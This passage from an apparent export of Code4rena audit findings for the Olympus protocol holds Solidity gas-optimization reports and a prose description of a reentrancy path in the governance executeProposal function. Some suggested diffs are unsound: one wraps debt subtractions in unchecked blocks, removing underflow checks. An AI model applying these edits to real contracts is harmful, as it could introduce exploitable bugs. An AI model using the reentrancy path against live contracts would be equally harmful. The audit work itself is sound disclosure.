[VOTES.sol:58](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/modules/VOTES.sol#L58) - [BondCallback.sol:143](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/BondCallback.sol#L143) - [BondCallback.sol:144](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/BondCallback.sol#L144) - [Governance.sol:194](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/Governance.sol#L194) - [Governance.sol:198](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/Governance.sol#L198) - [Governance.sol:252](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/Governance.sol#L252) - [Governance.sol:254](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/Governance.sol#L254) - [Heart.sol:103](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/Heart.sol#L103)  ### Total gas saved: **13 * 18 = 234**  ## **4. Shift right instead of dividing by 2**  Shifting one to the right will calculate a division by two.  he `SHR` opcode only requires 3 gas, compared to the `DIV` opcode's consumption of 5. Additionally, shifting is used to get around Solidity's division operation's division-by-0 prohibition.  **Proof of concept (*without optimizations*):**  ```javascript pragma solidity 0.8.15;  contract TesterA {  function testDiv(uint a) public returns (uint) { return a / 2; } }  contract TesterB {  function testShift(uint a) public returns (uint) { return a >> 1; } } ```  Gas saving executing: **172 per entry**  ``` TesterA.testDiv:    21965 TesterB.testShift:  21793    ```  **Affected source code:**  - [Operator.sol:372](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/Operator.sol#L372) - [Operator.sol:427](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/Operator.sol#L427)  ### Total gas saved: **172 * 2 = 344**  ## **5. `++i` costs less gas compared to `i++` or `i += 1`**  `++i` costs less gas compared to `i++` or `i += 1` for unsigned integer, as pre-increment is cheaper (about 5 gas per iteration). This statement is true even with the optimizer enabled.  `i++` increments `i` and returns the initial value of `i`. Which means:  ```solidity uint i = 1; i++; // == 1 but i == 2 ```  But `++i` returns the actual incremented value:  ```solidity uint i = 1; ++i; // == 2 and i == 2 too, so no need for a temporary variable ```  In the first case, the compiler has to create a temporary variable (when used) for returning `1` instead of `2` I suggest using `++i` instead of `i++` to increment the value of an uint variable. Same thing for `--i` and `i--`  *Keep in mind that this change can only be made when we are not interested in the value returned by the operation, since the result is different, you only have to apply it when you only want to increase a counter.*  **Affected source code:**  - [Operator.sol:488](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/Operator.sol#L488) - [Operator.sol:670](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/Operator.sol#L670) - [Operator.sol:675](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/Operator.sol#L675) - [Operator.sol:686](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/Operator.sol#L686) - [Operator.sol:691](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/Operator.sol#L691) - [KernelUtils.sol:49](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/utils/KernelUtils.sol#L49) - [KernelUtils.sol:64](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/utils/KernelUtils.sol#L64)  ## **6. There's no need to set default values for variables**  If a variable is not set/initialized, the default value is assumed (0, `false`, 0x0 ... depending on the data type). You are simply wasting gas if you directly initialize it with its default value.  **Proof of concept (*without optimizations*):**  ```javascript pragma solidity 0.8.15;  contract TesterA { function testInit() public view returns (uint) { uint a = 0; return a; } }  contract TesterB { function testNoInit() public view returns (uint) { uint a; return a; } } ```  Gas saving executing: **8 per entry**  ``` TesterA.testInit:   21392 TesterB.testNoInit: 21384    ```  **Affected source code:**  - [KernelUtils.sol:43](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/utils/KernelUtils.sol#L43) - [KernelUtils.sol:58](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/utils/KernelUtils.sol#L58)  ### Total gas saved: **8 * 2 = 16**      ## **7. Change `bool` to `uint256` can save gas**  Because each write operation requires an additional `SLOAD` to read the slot's contents, replace the bits occupied by the boolean, and then write back, `booleans` are more expensive than `uint256` or any other type that uses a complete word. This cannot be turned off because it is the compiler's defense against pointer aliasing and contract upgrades.  Reference:  - https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/security/ReentrancyGuard.sol#L23-L27  Also, this is applicable to integer types different than `uint256` or `int56`.  **Affected source code for `booleans`:**  - [IOperator.sol:34](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/interfaces/IOperator.sol#L34) - [Heart.sol:33](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/Heart.sol#L33) - [Governance.sol:105](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/Governance.sol#L105) - [Governance.sol:117](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/Governance.sol#L117) - [Operator.sol:63](https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Operator.sol#L63) - [Operator.sol:66](https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Operator.sol#L66)  **Affected source code for `integers`:**  - [PRICE.sol:44](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/modules/PRICE.sol#L44) - [PRICE.sol:47](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/modules/PRICE.sol#L47) - [PRICE.sol:50](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/modules/PRICE.sol#L50) - [PRICE.sol:53](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/modules/PRICE.sol#L53) - [PRICE.sol:56](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/modules/PRICE.sol#L56) - [PRICE.sol:62](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/modules/PRICE.sol#L62)  ## **8. Optimize `KEYCODE`**  It is possible to optimize the `KEYCODE` method from the `Module` contract as shown below, or send the keycode to the base constructor to use the immutable in the base contract, as shown below.  ```javascript abstract contract Module is KernelAdapter {     KeyCode private immutable _KEYCODE;     constructor(Kernel kernel_, string memory keycode) KernelAdapter(kernel_) {          _KEYCODE = toKeycode(\"MINTR\");     }     function KEYCODE() public pure virtual returns (Keycode) { return _KEYCODE; }     ... } contract OlympusTreasury is Module, ReentrancyGuard { ...     constructor(Kernel kernel_) Module(kernel_, \"PRICE\") {}     ... } ```  ### Optimize `MINTR.KEYCODE`  **Recommended changes:**  ```diff +   KeyCode private immutable _KEYCODE = toKeycode(\"MINTR\");     function KEYCODE() public pure override returns (Keycode) { +       return _KEYCODE; -       return toKeycode(\"MINTR\");     } ```  **Affected source code:**  - [MINTR.sol:20-22](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/modules/MINTR.sol#L20-L22)  ### Optimize `INSTR.KEYCODE`  **Recommended changes:**  ```diff +   KeyCode private immutable _KEYCODE = toKeycode(\"INSTR\");     function KEYCODE() public pure override returns (Keycode) { +       return _KEYCODE; -       return toKeycode(\"INSTR\");     } ```  **Affected source code:**  - [INSTR.sol:24](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/modules/INSTR.sol#L24)  ### Optimize `VOTES.KEYCODE`  **Recommended changes:**  ```diff +   KeyCode private immutable _KEYCODE = toKeycode(\"VOTES\");     function KEYCODE() public pure override returns (Keycode) { +       return _KEYCODE; -       return toKeycode(\"VOTES\");     } ```  **Affected source code:**  - [VOTES.sol:23](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/modules/VOTES.sol#L23)  ### Optimize `PRICE.KEYCODE`  **Recommended changes:**  ```diff +   KeyCode private immutable _KEYCODE = toKeycode(\"PRICE\");     function KEYCODE() public pure override returns (Keycode) { +       return _KEYCODE; -       return toKeycode(\"PRICE\");     } ```  **Affected source code:**  - [PRICE.sol:109](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/modules/PRICE.sol#L109)  ### Optimize `TRSRY.KEYCODE`  **Recommended changes:**  ```diff +   KeyCode private immutable _KEYCODE = toKeycode(\"TRSRY\");     function KEYCODE() public pure override returns (Keycode) { +       return _KEYCODE; -       return toKeycode(\"TRSRY\");     } ```  **Affected source code:**  - [TRSRY.sol:48](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/modules/TRSRY.sol#L48)  ### Optimize `RANGE.KEYCODE`  **Recommended changes:**  ```diff +   KeyCode private immutable _KEYCODE = toKeycode(\"RANGE\");     function KEYCODE() public pure override returns (Keycode) { +       return _KEYCODE; -       return toKeycode(\"RANGE\");     } ```  **Affected source code:**  - [RANGE.sol:111](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/modules/RANGE.sol#L111)  ## **9. Optimize  `requestPermissions`** ### Optimize  `OlympusPriceConfig.requestPermissions`  **Recommended changes:**  ```diff     function requestPermissions()         external         view         override         returns (Permissions[] memory permissions)     {         permissions = new Permissions[](3); +       Keycode priceCode = PRICE.KEYCODE(); +       permissions[0] = Permissions(priceCode, PRICE.initialize.selector); +       permissions[1] = Permissions(priceCode, PRICE.changeMovingAverageDuration.selector); +       permissions[2] = Permissions(priceCode, PRICE.changeObservationFrequency.selector); -       permissions[0] = Permissions(PRICE.KEYCODE(), PRICE.initialize.selector); -       permissions[1] = Permissions(PRICE.KEYCODE(), PRICE.changeMovingAverageDuration.selector); -       permissions[2] = Permissions(PRICE.KEYCODE(), PRICE.changeObservationFrequency.selector);     } ```  **Affected source code:**  - [PriceConfig.sol:32-34](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/PriceConfig.sol#L32-L34)  ### Optimize `VoterRegistration.requestPermissions`  **Recommended changes:**  ```diff     function requestPermissions()         external         view         override         returns (Permissions[] memory permissions)     {         permissions = new Permissions[](2); +       Keycode votesCode "}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-olympus-findings/issues/133", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed"], "target": "2022-08-olympus-findings", "body": "  # Gas Optimizations  ## Summary Of Findings:  \u00a0 | Issue  -- | --  1 | Caching storage variable and using `unchecked` in `updateMovingAverage()` function 2 | Simplify formulas and emit local variables in `updatePrices` function 3 | Caching storage variable in the `callback` function 4 | Caching storage variable in the `vote` function 5 | Caching storage variable in the `executeProposal` function  ## Detailed Report on Gas Optimization Findings:  ### 1. <ins>Caching storage variable and using `unchecked` in `updateMovingAverage()` function</ins> The [updateMovingAverage()](https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/modules/PRICE.sol#L122-L147) function in `PRICE.sol` can save gas by the following changes:   1. Cache the state variable `nextObsIndex`. Storage reads are much more expensive than memory reads (100 Vs 3).  2. Use uncheck block for the line `nextObsIndex = (nextObsIndex + 1) % numObs;`  As `numObs` is greater than zero from the previous calculation in the if-else block. And `nextObsIndex` can be safely assumed to be never equal to `type(uint32).max`.    The following `diff` shows the mitigation: ```diff diff --git \"a/.\\\\orig.txt\" \"b/.\\\\modified.txt\" index 7b37684..ca3cab4 100644 --- \"a/.\\\\orig.txt\" +++ \"b/.\\\\modified.txt\" @@ -6,8 +6,8 @@          uint32 numObs = numObservations;            // Get earliest observation in window -        uint256 earliestPrice = observations[nextObsIndex]; - +        uint32 cachednextObsIndex = nextObsIndex; +        uint256 earliestPrice = observations[cachednextObsIndex];           uint256 currentPrice = getCurrentPrice();            // Calculate new moving average @@ -18,9 +18,11 @@          }            // Push new observation into storage and store timestamp taken at -        observations[nextObsIndex] = currentPrice; +        observations[cachednextObsIndex] = currentPrice;          lastObservationTime = uint48(block.timestamp); -        nextObsIndex = (nextObsIndex + 1) % numObs; +        unchecked { +            nextObsIndex = (cachednextObsIndex + 1) % numObs;   +        }            emit NewObservation(block.timestamp, currentPrice, _movingAverage);      } ```  We convert 3 storage reads to 1 storage read and 2 memory reads. Along with the unchecked operation this will save us around 250 gas.  ### 2. <ins>Simplify formulas and emit local variables in `updatePrices` function</ins>  The [updatePrices](https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/modules/RANGE.sol#L158-L178) function in `RANGE.sol` can save gas by the following changes:   1. There are four equations which follow the same kind of pattern. For example: ```solidity movingAverage_ * (FACTOR_SCALE - wallSpread) / FACTOR_SCALE ``` This could be simplified as: ```solidity // expanding the equation         movingAverage_ * FACTOR_SCALE / FACTOR_SCALE - movingAverage_ * wallSpread / FACTOR_SCALE // which is simplified into:         movingAverage_ - movingAverage_ * wallSpread / FACTOR_SCALE //the right hand side of the above equation is used twice so we can calculate it and save it in a memory variable. Like this:         uint256 temp1 = movingAverage_ * wallSpread / FACTOR_SCALE;         _range.wall.low.price = movingAverage_ - temp1;         _range.wall.high.price = movingAverage_ + temp1; ```  2. The emit at the end of the function uses the above storage variables. But we can save gas by just doing the calculations directly:   Finally the mitigation diff with the above changes looks like this: ```diff diff --git \"a/.\\\\orig.txt\" \"b/.\\\\modified.txt\" index 57c28a0..78909cc 100644 --- \"a/.\\\\orig.txt\" +++ \"b/.\\\\modified.txt\" @@ -2,20 +2,20 @@          // Cache the spreads          uint256 wallSpread = _range.wall.spread;          uint256 cushionSpread = _range.cushion.spread; -          // Calculate new wall and cushion values from moving average and spread -        _range.wall.low.price = (movingAverage_ * (FACTOR_SCALE - wallSpread)) / FACTOR_SCALE; -        _range.wall.high.price = (movingAverage_ * (FACTOR_SCALE + wallSpread)) / FACTOR_SCALE; +        uint256 temp1 = movingAverage_ * wallSpread / FACTOR_SCALE; + +        _range.wall.low.price = movingAverage_ - temp1; +        _range.wall.high.price = movingAverage_ + temp1;   -        _range.cushion.low.price = (movingAverage_ * (FACTOR_SCALE - cushionSpread)) / FACTOR_SCALE; -        _range.cushion.high.price = -            (movingAverage_ * (FACTOR_SCALE + cushionSpread)) / -            FACTOR_SCALE; +        uint256 temp2 = movingAverage_ * cushionSpread / FACTOR_SCALE; +        _range.cushion.low.price = movingAverage_ - temp2; +        _range.cushion.high.price = movingAverage_ + temp2;            emit PricesChanged( -            _range.wall.low.price, -            _range.cushion.low.price, -            _range.cushion.high.price, -            _range.wall.high.price +             movingAverage_ - temp1, +             movingAverage_ - temp2, +             movingAverage_ + temp2, +             movingAverage_ + temp1          );      }  ``` The above optimization reduced the average gas consumption of `updatePrices` function from 40966 to 40605, which means a gas saving of **361**. This function is used by the [initialize](https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Operator.sol#L598), [operate](https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Operator.sol#L195)  and [setSpreads](https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Operator.sol#L498) functions in `Operator` contract as well. Which means effectively we save 3 times 361 = 1083 gas.   ### 3. <ins>Caching storage variable in the `callback` function</ins> The [callback](https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/BondCallback.sol#L100) function in the `BondCallback` contract reads the storage variable `ohm` multiple times. `ohm` could be cached to memory to save gas on storage reads.  The mitigation diff looks like this: ```diff diff --git \"a/.\\\\orig.txt\" \"b/.\\\\modified.txt\" index beb85a5..e559dc5 100644 --- \"a/.\\\\orig.txt\" +++ \"b/.\\\\modified.txt\" @@ -1,4 +1,4 @@ -    function callback( +  function callback(          uint256 id_,          uint256 inputAmount_,          uint256 outputAmount_ @@ -14,22 +14,22 @@          // Check that quoteTokens were transferred prior to the call          if (quoteToken.balanceOf(address(this)) < priorBalances[quoteToken] + inputAmount_)              revert Callback_TokensNotReceived(); - +        ERC20 cachedOHM = ohm;              // Handle payout -        if (quoteToken == payoutToken && quoteToken == ohm) { +        if (quoteToken == payoutToken && quoteToken == cachedOHM) {               // If OHM-OHM bond, only mint the difference and transfer back to teller              uint256 toMint = outputAmount_ - inputAmount_;              MINTR.mintOhm(address(this), toMint);                // Transfer payoutTokens to sender              payoutToken.safeTransfer(msg.sender, outputAmount_); -        } else if (quoteToken == ohm) { +        } else if (quoteToken == cachedOHM) {              // If inverse bond (buying ohm), transfer payout tokens to sender              TRSRY.withdrawReserves(msg.sender, payoutToken, outputAmount_);                // Burn OHM received from sender              MINTR.burnOhm(address(this), inputAmount_); -        } else if (payoutToken == ohm) { +        } else if (payoutToken == cachedOHM) {              // Else (selling ohm), mint OHM to sender              MINTR.mintOhm(msg.sender, outputAmount_);          } else {  ```   The mitigation reduced the max gas consumption of `callback` function from 187927 to 187847, which means a saving of 80 gas.  ### 4. <ins>Caching storage variable in the `vote` function</ins> The [vote](https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Governance.sol#L240-L262) function in the `Governance` contract reads the struct element `activeProposal.proposalId` multiple times. This could be cached to memory to save gas on storage reads.  The mitigation diff looks like this: ```diff diff --git \"a/.\\\\orig.txt\" \"b/.\\\\modified.txt\" index 6656cb4..2d24d2e 100644 --- \"a/.\\\\orig.txt\" +++ \"b/.\\\\modified.txt\" @@ -1,23 +1,23 @@      function vote(bool for_) external {          uint256 userVotes = VOTES.balanceOf(msg.sender); - -        if (activeProposal.proposalId == 0) { +        uint256 cachedID = activeProposal.proposalId; +        if (cachedID == 0) {  // @audit cache it.              revert NoActiveProposalDetected();          }   -        if (userVotesForProposal[activeProposal.proposalId][msg.sender] > 0) { +        if (userVotesForProposal[cachedID][msg.sender] > 0) {              revert UserAlreadyVoted();          }            if (for_) { -            yesVotesForProposal[activeProposal.proposalId] += userVotes; +            yesVotesForProposal[cachedID] += userVotes;          } else { -            noVotesForProposal[activeProposal.proposalId] += userVotes; +            noVotesForProposal[cachedID] += userVotes;          }   -        userVotesForProposal[activeProposal.proposalId][msg.sender] = userVotes; +        userVotesForProposal[cachedID][msg.sender] = userVotes;            VOTES.transferFrom(msg.sender, address(this), userVotes);   -        emit WalletVoted(activeProposal.proposalId, msg.sender, for_, userVotes); +        emit WalletVoted(cachedID, msg.sender, for_, userVotes);      } ```   The mitigation reduces the max storage reads from 5 to 1. Which can save up to 400 gas.  ### 5. <ins>Caching storage variable in the `executeProposal` function</ins> The [executeProposal](https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Governance.sol#L265-L289) function in the `Governance` contract reads the struct element `activeProposal.proposalId` multiple times. This could be cached to memory to save gas on storage reads. Plus the length of the array could be cached to save gas in the `for` loop.   The mitigation `diff` looks like this: ```diff diff --git \"a/.\\\\orig.txt\" \"b/.\\\\modified.txt\" index 733a8a2..41ff620 100644 --- \"a/.\\\\orig.txt\" +++ \"b/.\\\\modified.txt\" @@ -1,6 +1,7 @@      function executeProposal() external { -        uint256 netVotes = yesVotesForProposal[activeProposal.proposalId] - -            noVotesForProposal[activeProposal.proposalId]; +        uint256 cachedID = activeProposal.proposalId; +        uint256 netVotes = yesVotesForProposal[cachedID] -   +            noVotesForProposal[cachedID];          if (netVotes * 100 < VOTES.totalSupply() * EXECUTION_THRESHOLD) {              revert NotEnoughVotesToExecute();          } @@ -9,16 +10,16 @@              revert ExecutionTimelockStillActive();          }   -        Instruction[] memory instructions = INSTR.getInstructions(activeProposal.proposalId); - -        for (uint256 step; step < instructions.length; ) { -            kernel.executeAction(instructions[step].action, instructions[step].target); +        Instruction[] memory instructions = INSTR.getInstructions(cachedID); +        uint256 len = instructions.length; +        for (uint256 step; step < len; ) {   +            kernel.executeAction(instructions[step].action, instructions[step].target);               unchecked {                  ++step;              }          }   -        emit ProposalExecuted(activeProposal.proposalId); +        emit ProposalExecuted(cachedID);            // deactivate the active proposal          activeProposal = ActivatedProposal(0, 0); ```   The mitigation reduces the max storage reads from 4 to 1. Which can save up to 300 gas.  ## Conclusions:  \u00a0 | Issue | Gas Saved -- | -- | --  1 | Caching storage variable and using `unchecked` in `updateMovingAverage()` function | 250 2 | Simplify formulas and emit local variables in `updatePrices` function | 1083  3 | Caching storage variable in the `callback` function | 80 4 | Caching storage variable in the `vote` function | 400 5 | Caching storage variable in the `executeProposal` function | 300  ### TOTAL GAS SAVED = 250 + 1083 + 80 + 400 + 300 = <ins>2113</ins>. "}, {"title": "OlympusGovernance#executeProposal: reentrancy attack vulnerable function", "html_url": "https://github.com/code-423n4/2022-08-olympus-findings/issues/132", "labels": ["bug", "2 (Med Risk)", "sponsor confirmed"], "target": "2022-08-olympus-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Governance.sol#L265 https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Governance.sol#L278-L288   # Vulnerability details  ## Impact Given that the activeProposal change is done before the for loop, if this function is call through one kernel.executeAction(instruction,target) we can call the same instructions (in the same order) again and again, which may or may not affect funds (depending on the instructions).  ## Proof of Concept For instance, if we install a new module, and this module has a vulnerability (even intentional), the next steps can by trigger:  1. Call executeAction 1. This allow us to call kernel.executeAction in the for loop 1. executAction allow us to call **_installModule** 1. **\\_installModule** allow us to call **newModule_.Init** 1. By init we can call now executeProposal again (suppose that the init function interact with a previous vulnerable proxy contract to scam voters to vote in favour of this proposal as if it was a contract which is ok, and before calling executeProposal we change the implementation to allow this attack),  ## Tools Used Static Analysis  ## Recommended Mitigation Steps Use nonReentrant modifier or move the line ```activeProposal = ActivatedProposal(0, 0);``` before the for loop. "}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-olympus-findings/issues/119", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed", "old-submission-method"], "target": "2022-08-olympus-findings", "body": "https://github.com/code-423n4/2022-08-olympus/blob/main/src/Kernel.sol 1. unchecked : activePolicies.lenght-1 cannot underflow since element is pushed in previous statement  ``` git diff diff --git a/src/Kernel.sol b/src/Kernel.sol index 3a00ec5..c9a3536 100644 --- a/src/Kernel.sol +++ b/src/Kernel.sol @@ -297,7 +297,10 @@ contract Kernel {            // Add policy to list of active policies          activePolicies.push(policy_); -        getPolicyIndex[policy_] = activePolicies.length - 1; +        //activePolicies.lenght-1 cannot underflow since element is pushed in previous statement +        unchecked { +            getPolicyIndex[policy_] = activePolicies.length - 1; +        }            // Record module dependencies          Keycode[] memory dependencies = policy_.configureDependencies(); ```  https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/INSTR.sol 1. unchecked : totalInstructions cannot practically reach uint max  ``` git diff diff --git a/src/modules/INSTR.sol b/src/modules/INSTR.sol index 4536df2..56825ae 100644 --- a/src/modules/INSTR.sol +++ b/src/modules/INSTR.sol @@ -41,7 +41,10 @@ contract OlympusInstructions is Module {      /// @notice Store a list of Instructions to be executed in the future.      function store(Instruction[] calldata instructions_) external permissioned returns (uint256) {          uint256 length = instructions_.length; -        uint256 instructionsId = ++totalInstructions; +        uint256 instructionsId; +        unchecked { +            instructionsId = ++totalInstructions; +        }            Instruction[] storage instructions = storedInstructions[instructionsId]; ```  https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/RANGE.sol 1.  Use local variables to refer storage variables  ``` git diff diff --git a/src/modules/RANGE.sol b/src/modules/RANGE.sol index e878bac..5ff2cef 100644 --- a/src/modules/RANGE.sol +++ b/src/modules/RANGE.sol @@ -161,19 +161,20 @@ contract OlympusRange is Module {          uint256 cushionSpread = _range.cushion.spread;            // Calculate new wall and cushion values from moving average and spread -        _range.wall.low.price = (movingAverage_ * (FACTOR_SCALE - wallSpread)) / FACTOR_SCALE; -        _range.wall.high.price = (movingAverage_ * (FACTOR_SCALE + wallSpread)) / FACTOR_SCALE; +        //Use local variables to refer storage variables +        uint256 _r_wall_low_price = _range.wall.low.price = (movingAverage_ * (FACTOR_SCALE - wallSpread)) / FACTOR_SCALE; +        uint256 _r_wall_high_price = _range.wall.high.price = (movingAverage_ * (FACTOR_SCALE + wallSpread)) / FACTOR_SCALE;   -        _range.cushion.low.price = (movingAverage_ * (FACTOR_SCALE - cushionSpread)) / FACTOR_SCALE; -        _range.cushion.high.price = +        uint256 _r_cushion_low_price = _range.cushion.low.price = (movingAverage_ * (FACTOR_SCALE - cushionSpread)) / FACTOR_SCALE; +        uint256 _r_cushion_high_price = _range.cushion.high.price =              (movingAverage_ * (FACTOR_SCALE + cushionSpread)) /              FACTOR_SCALE;            emit PricesChanged( -            _range.wall.low.price, -            _range.cushion.low.price, -            _range.cushion.high.price, -            _range.wall.high.price +            _r_wall_low_price , +            _r_cushion_low_price, +            _r_cushion_high_price, +            _r_wall_high_price          );      } ``` https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/TRSRY.sol 1. Unchecked  ``` git diff diff --git a/src/modules/TRSRY.sol b/src/modules/TRSRY.sol index de9b630..7ec43e1 100644 --- a/src/modules/TRSRY.sol +++ b/src/modules/TRSRY.sol @@ -109,11 +109,14 @@ contract OlympusTreasury is Module, ReentrancyGuard {          uint256 prevBalance = token_.balanceOf(address(this));          token_.safeTransferFrom(msg.sender, address(this), amount_);   -        uint256 received = token_.balanceOf(address(this)) - prevBalance; +        uint256 received; +        unchecked { +            received = token_.balanceOf(address(this)) - prevBalance;   -        // Subtract debt from caller -        reserveDebt[token_][msg.sender] -= received; -        totalDebt[token_] -= received; +            // Subtract debt from caller +            reserveDebt[token_][msg.sender] -= received; +            totalDebt[token_] -= received; +        }            emit DebtRepaid(token_, msg.sender, received);      }  ``` https://github.com/code-423n4/2022-08-olympus/blob/main/src/utils/KernelUtils.sol 1. No need to initialize variable to 0. 2. use ++i instead of i++  ``` git diff diff --git a/src/utils/KernelUtils.sol b/src/utils/KernelUtils.sol index 125a674..69f7ea4 100644 --- a/src/utils/KernelUtils.sol +++ b/src/utils/KernelUtils.sol @@ -40,13 +40,13 @@ function ensureContract(address target_) view {  function ensureValidKeycode(Keycode keycode_) pure {      bytes5 unwrapped = Keycode.unwrap(keycode_);   -    for (uint256 i = 0; i < 5; ) { +    for (uint256 i; i < 5; ) {          bytes1 char = unwrapped[i];            if (char < 0x41 || char > 0x5A) revert InvalidKeycode(keycode_); // A-Z only            unchecked { -            i++; +            ++i;          }      }  } @@ -55,13 +55,13 @@ function ensureValidKeycode(Keycode keycode_) pure {  function ensureValidRole(Role role_) pure {      bytes32 unwrapped = Role.unwrap(role_);   -    for (uint256 i = 0; i < 32; ) { +    for (uint256 i; i < 32; ) {          bytes1 char = unwrapped[i];          if ((char < 0x61 || char > 0x7A) && char != 0x5f && char != 0x00) {              revert InvalidRole(role_); // a-z only          }          unchecked { -            i++; +            ++i;          }      }  } ```  https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol 1. Use unchecked for decimals increment 2. Use pre increment/decrement ``` git diff diff --git a/src/policies/Operator.sol b/src/policies/Operator.sol index 7573526..d8576c1 100644 --- a/src/policies/Operator.sol +++ b/src/policies/Operator.sol @@ -485,7 +485,9 @@ contract Operator is IOperator, Policy, ReentrancyGuard {          int8 decimals;          while (price_ >= 10) {              price_ = price_ / 10; -            decimals++; +            unchecked { +                ++decimals; +            }          }            /// Subtract the stated decimals from the calculated decimals to get the relative price decimals. @@ -683,12 +685,12 @@ contract Operator is IOperator, Policy, ReentrancyGuard {          if (currentPrice <= movingAverage) {              if (!regen.observations[regen.nextObservation]) {                  _status.high.observations[regen.nextObservation] = true; -                _status.high.count++; +                ++_status.high.count;              }          } else {              if (regen.observations[regen.nextObservation]) {                  _status.high.observations[regen.nextObservation] = false; -                _status.high.count--; +                --_status.high.count;              }          } ```  https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/BondCallback.sol 1. Use local variable to refer storage variable ``` git diff diff --git a/src/policies/BondCallback.sol b/src/policies/BondCallback.sol index 4da1a3a..f9fdab1 100644 --- a/src/policies/BondCallback.sol +++ b/src/policies/BondCallback.sol @@ -153,10 +153,12 @@ contract BondCallback is Policy, ReentrancyGuard, IBondCallback {          ERC20 token;          uint256 balance;          uint256 len = tokens_.length; +        //Use local variable to refer storage variable +        OlympusTreasury _TRSRY = TRSRY;          for (uint256 i; i < len; ) {              token = tokens_[i];              balance = token.balanceOf(address(this)); -            token.safeTransfer(address(TRSRY), balance); +            